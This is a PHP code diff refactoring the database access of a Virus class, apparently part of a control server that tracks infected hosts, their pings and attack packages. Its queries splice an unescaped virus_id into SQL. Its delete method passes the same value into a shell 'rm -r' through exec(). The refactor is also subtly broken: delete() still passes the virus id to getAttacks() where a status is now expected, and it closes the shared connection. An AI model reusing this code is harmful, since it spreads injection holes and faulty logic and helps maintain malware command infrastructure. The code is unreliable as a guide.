@@ -6,7 +6,7 @@ use Kelvinho\Virus\Attack\AttackFactory;
 use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\PackageRegistrar;
 use Kelvinho\Virus\Singleton\Logs;
-use function Kelvinho\Virus\db;
+use mysqli;
 use function Kelvinho\Virus\map;
 
 /**
@@ -36,16 +36,19 @@ class Virus {
     public const VIRUS_EXPECTING = 4; // viruses that have accessed the entry point, but have not pinged back yet
 
     private AttackFactory $attackFactory;
+    private mysqli $mysqli;
 
     /**
      * Virus constructor.
      * @param string $virus_id
      * @param AttackFactory $attackFactory
+     * @param mysqli $mysqli
      * @internal
      */
-    public function __construct(string $virus_id, AttackFactory $attackFactory) {
+    public function __construct(string $virus_id, AttackFactory $attackFactory, mysqli $mysqli) {
         $this->virus_id = $virus_id;
         $this->attackFactory = $attackFactory;
+        $this->mysqli = $mysqli;
         $this->loadState();
     }
 
@@ -53,9 +56,7 @@ class Virus {
      * The virus will use this to tell that it's still alive and listening.
      */
     public function ping(): void {
-        $mysqli = db();
-        $mysqli->query("update viruses set last_ping = " . time() . " where virus_id = \"$this->virus_id\"");
-        $mysqli->close();
+        $this->mysqli->query("update viruses set last_ping = " . time() . " where virus_id = \"$this->virus_id\"");
     }
 
     public function getVirusId(): string {
@@ -90,14 +91,13 @@ class Virus {
      * Deletes the virus permanently.
      */
     public function delete(): void {
-        map(Virus::getAttacks($this->virus_id), function ($attack_id) {
+        map($this->getAttacks($this->virus_id), function ($attack_id) {
             $attack = $this->attackFactory->get($attack_id);
             $attack->delete();
         });
-        $mysqli = db();
-        $mysqli->query("delete from viruses where virus_id = \"$this->virus_id\"");
-        $mysqli->query("delete from uptimes where virus_id = \"$this->virus_id\"");
-        $mysqli->close();
+        $this->mysqli->query("delete from viruses where virus_id = \"$this->virus_id\"");
+        $this->mysqli->query("delete from uptimes where virus_id = \"$this->virus_id\"");
+        $this->mysqli->close();
         exec("rm -r " . DATA_FILE . "/viruses/$this->virus_id");
     }
 
@@ -105,9 +105,7 @@ class Virus {
      * Saves the virus state/representation
      */
     public function saveState(): void {
-        $mysqli = db();
-        $mysqli->query("update viruses set name = \"" . $mysqli->escape_string($this->name) . "\" where virus_id = \"$this->virus_id\"");
-        $mysqli->close();
+        $this->mysqli->query("update viruses set name = \"" . $this->mysqli->escape_string($this->name) . "\" where virus_id = \"$this->virus_id\"");
         file_put_contents(DATA_FILE . "/viruses/$this->virus_id/profile.txt", $this->profile);
     }
 
@@ -115,25 +113,22 @@ class Virus {
      * Fetch data to restore the state of the virus.
      */
     private function loadState() {
-        $mysqli = db();
-        $row = $mysqli->query("select name, last_ping, type from viruses where virus_id = \"$this->virus_id\"")->fetch_assoc();
+        $row = $this->mysqli->query("select name, last_ping, type from viruses where virus_id = \"$this->virus_id\"")->fetch_assoc();
         $this->name = $row["name"];
         $this->last_ping = $row["last_ping"];
         $this->isStandalone = 1 - $row["type"];
-        $mysqli->close();
         $this->profile = file_get_contents(DATA_FILE . "/viruses/$this->virus_id/profile.txt");
     }
 
     /**
      * Get attacks as an array.
      *
-     * @param string $virus_id The virus id
      * @param string|null $status Optional attack status
      * @param string|null $attack_package Optional attack package name
      * @return array The attacks
      */
-    public static function getAttacks(string $virus_id, string $status = null, string $attack_package = null) {
-        $whereStatement = "where virus_id = \"" . $virus_id . "\"";
+    public function getAttacks(string $status = null, string $attack_package = null) {
+        $whereStatement = "where virus_id = \"" . $this->virus_id . "\"";
         if ($status != null) {
             if (in_array($status, AttackBase::STATUSES)) {
                 $whereStatement .= " and status = \"$status\"";
@@ -148,9 +143,7 @@ class Virus {
                 Logs::error("Attack package $attack_package does not exist");
             }
         }
-        $mysqli = db();
-        $answer = $mysqli->query("select attack_id from attacks $whereStatement order by executed_time desc");
-        $mysqli->close();
+        $answer = $this->mysqli->query("select attack_id from attacks $whereStatement order by executed_time desc");
         $result = [];
         if ($answer) {
             while ($row = $answer->fetch_assoc()) {
@@ -158,25 +151,6 @@ class Virus {
             }
         }
         return $result;
-    }
-
-    /**
-     * Checks whether the virus id exists or not
-     *
-     * @param string $virus_id The virus id
-     * @return bool Exists?
-     */
-    public static function exists(string $virus_id): bool {
-        $mysqli = db();
-        $answer = $mysqli->query("select virus_id from viruses where virus_id = \"" . $mysqli->escape_string($virus_id) . "\"");
-        $mysqli->close();
-        if ($answer) {
-            $row = $answer->fetch_assoc();
-            if ($row) {
-                return true;
-            }
-        }
-        return false;
     }
 
     /**
